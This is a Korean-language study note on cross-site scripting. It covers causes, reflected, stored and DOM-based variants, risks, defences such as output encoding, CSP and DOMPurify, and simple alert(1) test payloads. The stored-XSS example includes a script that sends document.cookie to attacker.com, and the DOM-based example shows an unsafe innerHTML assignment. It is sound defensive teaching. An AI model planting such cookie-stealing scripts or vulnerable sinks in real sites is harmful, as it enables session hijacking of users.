## XSS
신뢰되지 않은 입력값이 적절한 검증 또는 인코딩 없이 브라우저에 전달되어, 해당 브라우저에서 악성 스크립트가 실행되는 취약점

### 원인
1. 사용자 입력값 검증 미흡
- 게시글, 댓글, 검색창, URL 파라미터 등 외부 입력값에 대한 필터링 부족
- `<script>`, 이벤트 핸들러(onerror, onload 등)와 같은 스크립트 요소 차단 미흡

2. 출력 시 인코딩 미적용
- HTML, JavaScript, URL, CSS 등 컨텍스트에 맞는 출력 인코딩 미사용
- `<, >, ', "` 등 특수문자를 그대로 출력

3. 신뢰할 수 없는 데이터 사용
- 쿠키, HTTP 헤더, 외부 API 응답값 등 사용자에 의해 조작 가능한 데이터를 검증 없이 출력

### 공격 유형
##### Reflected XSS
악성 스크립트가 서버의 응답에 그대로 포함되어 브라우저에 전달되고, 해당 브라우저에서 실행되는 공격 방식
- 요청 값이 즉시 응답에 반영되는 위치(URL 파라미터, 검색창 등)에서 발생 
- 서버나 DB에 악성 스크립트가 저장되지 않음

```
Reflected XSS 공격 예시
https://example.com/search?a=<script>alert(1)</script>
```

##### Stored XSS
악성 스크립트가 서버(DB 등)에 저장되어, 해당 페이지를 방문하는 사용자 브라우저에서 지속적으로 실행되는 공격 방식
- 서버에 저장되는 입력 영역(게시글, 댓글 등)에서 발생
- 페이지에 접속하는 모든 사용자에게 자동 실행
- 서버에 저장되므로 전파 범위가 넓고 위험도가 높음

```
Stored XSS 공격 예시
<script>
fetch('https://attacker.com?c='+document.cookie)
</script>
// 사용자 쿠키를 공격자 서버로 전송하여 세션 탈취 시도
```

##### DOM-Based XSS
클라이언트 측 JavaScript가 DOM을 조작하는 과정에서 사용자 입력값을 안전하게 처리하지 않아 악성 스크립트가 실행되는 공격 방식
- 서버 응답은 정상이며, 공격은 클라이언트 측에서 발생
- 브라우저 내 JavaScript 코드에서 DOM에 직접 삽입될 때 발생
- 서버 로그나 WAF에서 탐지하기 어려움

```
DOM-Based XSS 공격 예시
https://example.com/#<img src="x" onerror=alert(1)>
```
```javascript
document.getElementById("output").innerHTML = location.hash.substring(1);
// URL의 해시(#) 뒤 값을 그대로 HTML에 삽입
// 악성 스크립트가 포함될 경우 브라우저에서 즉시 실행됨
```

### 위험도
- 세션 탈취
- 사용자 계정 획득
- 페이지 변조
- 악성 사이트 리다이렉트
- 권한 상승

### 대응 방안
1. 입력값 검증
- 허용된 문자만 처리하는 화이트리스트 기반 필터링
- `<script>`, 이벤트 속성(onerror, onload 등) 등 악성 입력 필터링

2. 출력 시 인코딩
- 사용자 입력값이 HTML, JS, URL, CSS 등에 그대로 삽입되지 않도록 처리
- 출력되는 컨텍스트에 맞는 인코딩 적용
```
HTML : HTML Entity Encoding
JavaScript : JavaScript Encoding
URL : URL Encoding
CSS : CSS Encoding
```

3. CSP(Content Security Policy) 적용
- 인라인 스크립트 실행 차단
- 허용된 출처(Origin)의 스크립트만 실행
```
Content-Security-Policy: default-src 'self'
```

4. 보안 라이브러리 사용
- OWASP ESAPI
- DOMPurify

### 테스트 방법
1. 기본 스크립트 삽입 테스트
```
<script>alert(1)</script>
```

2. 이벤트 핸들러 테스트
```
<img src="x" onerror=alert(1)>
```

3. URL 파라미터 테스트
```
URL?a=<script>alert(1)</script>
```
